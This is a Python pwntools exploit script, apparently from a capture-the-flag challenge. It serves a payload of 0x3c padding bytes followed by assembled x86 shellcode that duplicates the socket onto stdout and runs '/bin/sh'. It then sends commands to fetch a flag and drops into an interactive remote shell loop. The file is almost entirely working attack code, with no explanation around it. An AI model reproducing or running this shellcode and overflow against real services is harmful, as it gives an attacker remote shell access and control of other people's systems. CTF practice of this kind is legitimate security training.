import socket
from pwn import *

#dup2(socket, stdout) and execve('/bin/sh')
shell = asm('''
            mov eax, 0x3f
            mov ebx, edi
            mov ecx, 1
            int 0x80
            
            
            mov eax, 0xb
            push 0x68732f
            push 0x6e69622f
            mov ebx, esp
            mov ecx, 0
            mov edx, 0
            int 0x80''')
soc = socket.socket()
port = 12100

soc.bind(('', port))
soc.listen(1)

print('Socket is listening')

while True:
    con, addr = soc.accept()
    print('GOt connection from {}'.format(addr))

    con.send(b'A'*0x3c + shell)
    print('call shell')
    con.send(b'cd home/flag\n')
    con.send(b'./get_flag\n')
    con.recv(1024)
    con.send(b'./I_am_fl4g' + b'\x00\n')
    print(con.recv(1024))
    # interactive
    while True:
        print('> ', end = '')
        command = input()
        command += '\n'
        con.send(command.encode())
        if 'cd' not in command:
            print(con.recv(1024).decode())
    con.close()
